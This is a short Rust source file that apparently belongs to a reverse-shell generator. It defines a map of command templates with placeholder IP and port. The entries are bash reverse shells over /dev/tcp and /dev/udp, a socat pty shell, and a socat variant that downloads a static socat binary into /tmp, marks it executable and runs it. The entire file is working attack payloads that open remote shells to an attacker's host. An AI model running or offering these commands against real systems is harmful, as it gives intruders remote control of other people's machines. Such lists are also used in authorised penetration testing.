use lazy_static::lazy_static;

use std::collections::HashMap;
lazy_static! {
    pub static ref COMMANDLIST: HashMap<String, String> = {
        let mut m = HashMap::new();
        m.insert(
            "bash_tcp".to_string(),
            "bash -i >& /dev/tcp/{SUBIP}/{SUBPORT} 0>&1".to_string(),
        );
        m.insert(
            "bash_udp".to_string(),
            "bash -i >& /dev/udp/{SUBIP}/{SUBPORT} 0>&1".to_string(),
        );
        m.insert("socat".to_string(),
                 "socat file:`tty`,raw,echo=0 TCP-L:{SUBPORT};/tmp/socat exec:\
                 'bash -li',pty,stderr,setsid,sigint,sane tcp:{SUBIP}:{SUBPORT}"
                 .to_string());
        m.insert("socat_wget".to_string(),
                "wget -q https://github.com/andrew-d/static-binaries\
                /raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x\
                /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,\
                sane tcp:{SUBIP}:{SUBPORT}".to_string());
        m
    };
}
